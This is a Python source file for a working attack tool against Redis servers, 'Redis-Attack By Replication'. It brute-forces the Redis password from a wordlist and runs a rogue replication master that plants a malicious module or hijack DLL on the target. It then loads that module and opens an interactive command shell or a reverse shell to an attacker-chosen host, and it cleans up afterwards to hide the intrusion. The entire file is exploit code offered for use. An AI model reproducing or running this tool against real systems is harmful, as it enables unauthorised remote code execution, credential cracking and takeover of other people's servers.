# coding:utf-8
import socket
import os
import sys
import re
from time import sleep
import argparse
from six.moves import input

CLRF = "\r\n"
LOGO = R"""
██████╗  █████╗ ██████╗ ██████╗ 
██╔══██╗██╔══██╗██╔══██╗██╔══██╗
██████╔╝███████║██████╔╝██████╔╝
██╔══██╗██╔══██║██╔══██╗██╔══██╗
██║  ██║██║  ██║██████╔╝██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝
Redis-Attack By Replication(linux:4.x/5.x win:>=2.8) author:0671
"""
usage = R"""python redis-attack.py [-h] -r RHOST [-p RPORT] -L LHOST [-P LPORT] [-wf WINFILE] [-lf LINUXFILE] [-a AUTH] [--brute] [-v]
Example: 
    python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 --brute
    python redis-attack.py -r 192.168.1.234 -L 192.168.1.2 -P 80 -b mypwd.txt -i
"""

# Convert command arrays to RESP arrays 
def mk_cmd_arr(arr):
    cmd = ""
    cmd += "*" + str(len(arr))
    for arg in arr:
        cmd += CLRF + "$" + str(len(arg))
        cmd += CLRF + arg
    cmd += "\r\n"
    return cmd

# Convert the Redis command to command array 
def mk_cmd(raw_cmd):
    return mk_cmd_arr(raw_cmd.split(" "))

# Receive data from SOCK 
def din(sock, cnt):
    msg = sock.recv(cnt)
    if verbose:
        if len(msg) < 300:
            print("\033[1;34;40m[->]\033[0m {}".format(msg))
        else:
            print("\033[1;34;40m[->]\033[0m {}......{}".format(msg[:80], msg[-80:]))
    if sys.version_info < (3, 0):
        res = re.sub(r'[^\x00-\x7f]', r'', msg)
    else:
        res = re.sub(b'[^\x00-\x7f]', b'', msg)
    return res.decode()

# Send data to SOCK 
def dout(sock, msg):
    if type(msg) != bytes:
        msg = msg.encode()
    sock.send(msg)
    if verbose:
        if sys.version_info < (3, 0):
            msg = repr(msg)
        if len(msg) < 300:
            print("\033[1;32;40m[<-]\033[0m {}".format(msg))
        else:
            print("\033[1;32;40m[<-]\033[0m {}......{}".format(msg[:80], msg[-80:]))

# Decoding the return result of the execution command of the interactive shell 
def decode_shell_result(s):
    return "\n".join(s.split("\r\n")[1:-1])

# This is the REDIS client 
class Remote:
    def __init__(self, rhost, rport):
        self._host = rhost
        self._port = rport
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.connect((self._host, self._port))

    # send data 
    def send(self, msg):
        dout(self._sock, msg)

    # Receive data 
    def recv(self, cnt=65535):
        return din(self._sock, cnt)

    # Send the redis command and receive the return value 
    def do(self, cmd):
        self.send(mk_cmd(cmd))
        buf = self.recv()
        return buf

    # Close the connection
    def close(self):
        self._sock.close()

    # Send system commands and receive return values
    def shell_cmd(self, cmd):
        self.send(mk_cmd_arr(['system.exec', "{}".format(cmd)]))
        buf = self.recv()
        return buf
    # Send a command to perform a reverse shell
    def reverse_shell(self, addr, port):
        self.send(mk_cmd("system.rev {} {}".format(addr, port)))

# This is a Rogue Redis Server for transmitting malicious data in master-slave replication. 
class RogueServer:
    def __init__(self, lhost, lport, remote, file):
        self._host = lhost
        self._port = lport
        self._remote = remote
        self._file = file
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.bind(('0.0.0.0', self._port))
        self._sock.settimeout(15)
        self._sock.listen(10)

    # Respond to the request of the slave, then transmit malicious data 
    def handle(self, data):
        resp = ""
        phase = 0
        if data.find("PING") > -1:
            resp = "+PONG" + CLRF
            phase = 1
        elif data.find("REPLCONF") > -1:
            resp = "+OK" + CLRF
            phase = 2
        elif data.find("PSYNC") > -1 or data.find("SYNC") > -1:
            resp = "+FULLRESYNC " + "Z" * 40 + " 0" + CLRF
            resp += "$" + str(len(payload)) + CLRF
            resp = resp.encode()
            resp += payload + CLRF.encode()
            phase = 3
        return resp, phase

    # Close the connection
    def close(self):
        self._sock.close()
    # Start listening, then perform file transfer under master-slave replication
    def exp(self):
        try:
            cli, addr = self._sock.accept()
            print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(addr[0], addr[1]))
            while True:
                data = din(cli, 1024)
                if len(data) == 0:
                    break
                resp, phase = self.handle(data)
                dout(cli, resp)
                if phase == 3:
                    break
        except Exception as e:
            print("\033[1;31;m[-]\033[0m Error: {}, exit".format(e))
            cleanup(self._remote, self._file) # When an error occurs, restore the configuration of the target Redis 
            exit(0)
        except KeyboardInterrupt:
            print("[-] User Quit..")
            exit(0)

# Set up the host and IP of the reverse shell, then execute 
def reverse(remote):
    print("[*] Open reverse shell...")
    addr = input("[*] Reverse server address: ")
    port = input("[*] Reverse server port: ")
    remote.reverse_shell(addr, port)
    print("\033[92m[+]\033[0m Reverse shell payload sent.")
    print("[*] Check at {}:{}".format(addr, port))

# Set the command of interaction shell, then execute 
def interact(remote):
    print("\033[92m[+]\033[0m Interactive shell open , use \"exit\" to exit...")
    try:
        while True:
            cmd = input("$ ")
            cmd = cmd.strip()
            if cmd == "exit":
                return
            r = remote.shell_cmd(cmd)
            if 'unknown command' in r:
                print("\033[1;31;m[-]\033[0m Error:{} , check your module!".format(r.strip()))
                # return
                continue
            for l in decode_shell_result(r).split("\n"):
                if l:
                    print(l)
    except KeyboardInterrupt:
        return

# Clean malicious modules under Linux 
def cleanup(remote, expfile):
    print("[*] Clean up..")
    remote.do("CONFIG SET dbfilename dump.rdb")
    remote.shell_cmd("rm ./{}".format(expfile))
    remote.do("MODULE UNLOAD system")
    # remote.close()

#  Overwrit the malicious module under Windows (because you can't delete the imported DLL) 
def overwrite_winmodule(remote,rogue, expfile):
    print("[*] Overwrite..")
    global payload
    remote.do("MODULE UNLOAD system")
    payload = b"hello world"
    rogue.exp()
    sleep(2)
    remote.do("SLAVEOF NO ONE")
    
# Print the remote IP and port 
def printback(remote):
    back = remote._sock.getpeername()
    print("\033[92m[+]\033[0m Accepted connection from {}:{}".format(back[0], back[1]))

# Run attack program 
def run(rhost, rport, lhost, lport):
    # Brute force attack Redis 
    def bruteRedis():
        if os.path.exists(brute) == False:
            print("\033[1;31;m[-]\033[0m Where is your brute dict file? ")
            exit(0)
        with open(brute,'r')as f:
            pwd = f.readline()
            while pwd:
                pwd = pwd.strip()
                check = remote.do("AUTH {}".format(pwd))
                if "OK" in check:
                    return 1,pwd
                pwd = f.readline()
        return 0,0
    try:
        remote = Remote(rhost, rport)
        need_auth = False
        check = remote.do("AUTH {}".format(auth))
        if "but no password is set" in check: # No need to verify password 
            if auth != "gugugu": # The command line has set a password
                print("\033[1;31;m[-]\033[0m No password required !")
            else:
                pass
        elif "invalid password" in check: # wrong password 
            need_auth = True # Set the sign that needs to verify the password 
            if brute:
                state,pwd=bruteRedis()
                if state:
                    print("\033[92m[+]\033[0m Successfully found password: \033[92m{}\033[0m".format(pwd))
                else:
                    print("\033[1;31;40m[-]\033[0m No found password.")
                    return
            else:
                if auth != "gugugu":
                    print("\033[1;31;40m[-]\033[0m Wrong password !")
                    return
                else:
                    print("\033[1;31;40m[-]\033[0m Need password.")
                    return
        else: # Password correct 
            pwd = auth
            need_auth = True

        # Get the version of Redis, the system, the number of system bits 
        info = remote.do("INFO")
        redis_version = info[info.find('redis_version:')+len("redis_version:"):info.find('\r\n',info.find('redis_version:'))]
        redis_os = info[info.find('os:')+len("os:"):info.find('\r\n',info.find('os:'))]
        redis_arch_bits = info[info.find('arch_bits:')+len("arch_bits:"):info.find('\r\n',info.find('arch_bits:'))]
        print("[*] Redis version: {}".format(redis_version))
        print("[*] Redis os: {}".format(redis_os))
        print("[*] Redis arch_bits: {}".format(redis_arch_bits))

        # Depending on the Redis version and the system, determine the file transferred in the master-slave replication 
        if 'Linux' in redis_os and int(redis_version[0])>=4:
            print("[√] Can use master-slave replication to load the RedisModule to attack the redis")
            if os.path.exists(linuxfilename) == False:
                print("\033[1;31;m[-]\033[0m Where is your module(linux)? ")
                exit(0)
            expfile = os.path.basename(linuxfilename)
        elif 'Windows' in redis_os:
            print("[√] Can use master-slave replication to hijack dbghelp.dll to attack the redis")
            if os.path.exists(winfilename[0]) == False:
                print("\033[1;31;40m[-]\033[0m Where is your dbghelp.dll? ")
                exit(0)
            if int(redis_version[0])>=4:
                print("[√] Can use master-slave replication to load the RedisModule to attack the redis")
                if os.path.exists(winfilename[1]) == False:
                    print("\033[1;31;40m[-]\033[0m Where is your module(win)? ")
                    exit(0)
            while 1:
                choice = input("\033[92m[+]\033[0m What do u want ? [h]ijack dbghelp.dll or [l]oad module or [e]xit: ")
                if choice.startswith("h"):
                    expfile = os.path.basename(winfilename[0])
                    break
                elif choice.startswith("l") and int(redis_version[0])>=4:
                    expfile = os.path.basename(winfilename[1])
                    break
                elif choice.startswith("l") and int(redis_version[0])<4:
                    print("\033[92m[!]\033[0m Target Redis is < 4.0 and does not support module load , please select [h]ijack dbghelp.dll")
                    continue
                if choice.startswith("e"):
                    print("[*] User Quit..")
                    return
        else:
            print("[#] Please use other tools to attack the redis")
            return
        global payload,idontcare
        # Read malicious files that need to be transmitted 
        payload = open(expfile, "rb").read()
        print("[*] Setting filename")
        print("[*] Sending SLAVEOF command to server")
        # Set the target redis as a slave
        remote.do("SLAVEOF {} {}".format(lhost, lport))
        printback(remote)
        if idontcare == False:
            # If you don't set an `idontcare` flag, data protection is performed 
            print("[*] Saveing dbdata")
            if need_auth:
                os.environ["REDISDUMPGO_AUTH"] = pwd
            # Keep Redis data as command form redis-dump-go
            if "darwin" in sys.platform:
                rdfile = os.path.join(os.path.basename("util"),"rd_osx") 
                os.system("chmod 754 {}".format(rdfile))
            elif "linux" in sys.platform:
                rdfile = os.path.join(os.path.basename("util"),"rd_linux")
                os.system("chmod 754 {}".format(rdfile))
            elif "win" in sys.platform:
                rdfile = os.path.join(os.path.basename("util"),"rd_win") 
            os.system("{} -host {} -port {} -s -output commands > {}".format(rdfile, rhost, rport, "_redis-db.dump"))
        # Set the dbfilename of the target Redis 
        remote.do("CONFIG SET dbfilename {}".format(expfile))
        printback(remote)
        # Sleep is necessary, because the target redis accepts commands and processing commands to have certain time 
        sleep(2)
        print("[*] Start listening on {}:{}".format(lhost, lport))
        # Run the Rogue Redis server and transfer data 
        rogue = RogueServer(lhost, lport, remote, expfile)
        print("[*] Tring to run payload")
        rogue.exp()
        sleep(2)
        
        if 'Linux' in redis_os:
            # If it is Linux, load a malicious module 
            remote.do("MODULE LOAD ./{}".format(expfile)) 
            remote.do("SLAVEOF NO ONE")
            print("[*] Closing rogue server...")
            rogue.close()
            # Module operation, interacting shell or reverse shell 
            choice = input("\033[92m[+]\033[0m What do u want ? [i]nteractive shell or [r]everse shell or [e]xit: ")
            if choice.startswith("i"):
                interact(remote)
            elif choice.startswith("r"):
                reverse(remote)
            elif choice.startswith("e"):
                pass
            cleanup(remote, expfile) # Clean up module file 
        elif 'Windows' in redis_os:
            # If it is Windows, according to the original selection, the DLL hijack or load a malicious module is performed. 
            if choice.startswith("h"):
                remote.do("BGSAVE") # Hijack dbghelp.dll
            else:
                remote.do("MODULE LOAD ./{}".format(expfile)) # load a malicious module
                interact(remote) # reverse shell 
                rogue.close()
                # Need to restart the Rogue Redis server, using the original server may result in failure to connect
                rogue = RogueServer(lhost, lport, remote, expfile) # 
                overwrite_winmodule(remote, rogue, expfile) # Overwrit the malicious module
            remote.do("SLAVEOF NO ONE")
            remote.do("CONFIG SET dbfilename dump.rdb")
            print("[*] Closing rogue server...")
            rogue.close()

        if idontcare == False:
            print("[*] Refuseing dbdata ",end='')
            for line in open("_redis-db.dump"):
                print('.',end='')
                line = line.strip()
                # Restore the Redis data in the form of command. 
                check = remote.do(line)
            sleep(2)
            remote.do("SAVE")
            os.remove("_redis-db.dump")
        remote.close()
        print()
    except Exception as e:
        print("\033[1;31;m[-]\033[0m Error found : {} \n[*] Exit..".format(e))

def main():
    parser = argparse.ArgumentParser(description='',usage = usage)
    
    parser.add_argument("-r", "--rhost", dest="rhost", type=str, help="target host", required=True)
    parser.add_argument("-p", "--rport", dest="rport", type=int,help="target redis port, default 6379", default=6379)
    parser.add_argument("-L", "--lhost", dest="lhost", type=str,help="rogue server ip", required=True)
    parser.add_argument("-P", "--lport", dest="lport", type=int,help="rogue server listen port, default 16379", default=16379)
    parser.add_argument("-wf", "--winfile", type=str, help="Dll Used to hijack redis, default dbghelp.dll", default='dbghelp.dll')
    parser.add_argument("-wf2", "--winfile2", type=str, help="RedisModules(win) to load, default exp.dll", default='exp.dll')
    parser.add_argument("-lf", "--linuxfile", type=str, help="RedisModules(linux) to load, default exp.so", default='exp.so')
    parser.add_argument("-a", "--auth", dest="auth", type=str, help="redis password", default='gugugu')
    parser.add_argument("-b","--brute", nargs='?', help="If redis needs to verify the password, perform a brute force attack, dict default pwd.txt",const='pwd.txt',default=False)
    parser.add_argument("-i", "--idontcare", action="store_true", help="don't care about the data on the target redis", default=False)
    parser.add_argument("-v", "--verbose", action="store_true", help="show more info", default=False)
    options = parser.parse_args()

    print("[*] Connecting to  {}:{}...".format(options.rhost, options.rport))
    global payload, verbose, linuxfilename, winfilename, auth, brute, idontcare
    auth = options.auth
    brute = options.brute
    linuxfilename = options.linuxfile
    winfilename = [options.winfile,options.winfile2]
    idontcare = options.idontcare
    verbose = options.verbose
    run(options.rhost, options.rport, options.lhost, options.lport)


if __name__ == '__main__':
    print(LOGO)
    # if len(sys.argv)==1:
    #     sys.argv.append('-h')
    main()